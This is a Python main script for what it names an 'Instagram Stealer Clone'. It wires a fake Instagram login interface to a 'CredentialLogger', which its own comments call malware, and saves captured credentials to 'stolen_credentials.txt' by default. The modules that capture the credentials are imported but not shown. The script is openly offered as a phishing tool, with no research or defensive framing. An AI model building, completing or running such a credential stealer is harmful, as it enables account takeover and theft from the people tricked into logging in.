import os
from src.auth_service import AuthenticationService
from src.logger import CredentialLogger
 
def main():
    """Main execution function for the Instagram Stealer Clone."""
 
    # --- Configuration Loading ---
    # Load environment variables from .env file if present, or use defaults
    try:
        from dotenv import load_dotenv
        load_dotenv()
    except ImportError:
        print("[WARNING] python-dotenv not found. Ensure you run: pip install python-dotenv")
 
    log_path = os.getenv("LOG_FILE_PATH", "stolen_credentials.txt")
 
    print(f"[*] Starting Instagram Stealer Clone...")
    print(f"[*] Credentials will be saved to: {log_path}")
 
    # --- Initialization ---
    try:
        # 1. Setup Logger (The data collector/malware)
        logger = CredentialLogger(log_file_path=log_path)
 
        # 2. Setup Auth Service (The application front-end)
        auth_service = AuthenticationService(logger=logger)
 
        # 3. Run the Application
        auth_service.run_login_interface()
 
    except Exception as e:
        print(f"\n[FATAL ERROR] An unexpected error occurred: {e}")
 
if __name__ == "__main__":
    main()
